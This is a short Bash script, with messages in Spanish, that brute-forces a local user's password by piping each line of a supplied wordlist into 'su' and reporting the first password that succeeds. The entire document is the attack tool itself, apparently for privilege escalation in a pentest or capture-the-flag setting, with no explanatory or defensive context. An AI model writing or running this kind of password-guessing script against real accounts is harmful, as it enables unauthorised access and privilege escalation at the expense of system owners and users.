#!/bin/bash

usuario="$1"
wordlist="$2"

if [ -z "$usuario" ] || [ -z "$wordlist" ]; then
    echo "Uso: $0 <usuario> <wordlist>"
    exit 1
fi

while IFS= read -r pass; do
    if echo "$pass" | su "$usuario" -c "echo SUCCESS" 2>/dev/null | grep -q "SUCCESS"; then
        echo "[+] Encontrado: $usuario:$pass"
        exit 0
    fi
done < "$wordlist"

echo "[-] No se encontró contraseña para $usuario"
